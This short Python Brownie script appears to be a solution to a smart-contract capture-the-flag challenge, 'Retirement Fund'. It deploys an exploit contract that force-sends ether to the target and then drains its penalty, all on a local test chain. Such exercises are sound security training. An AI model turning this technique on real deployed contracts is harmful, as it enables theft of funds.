from brownie import RetirementFundChallenge, Rf_Exploit, accounts


def main():
    deployer = accounts[0]
    player = accounts[1]

    contract = RetirementFundChallenge.deploy(
        player, {'from': deployer, 'value': '1 ether'})
    Rf_Exploit.deploy(
        contract.address, {'from': player, 'value': '1 ether'})

    contract.collectPenalty({'from': player})

    assert contract.isComplete() == True
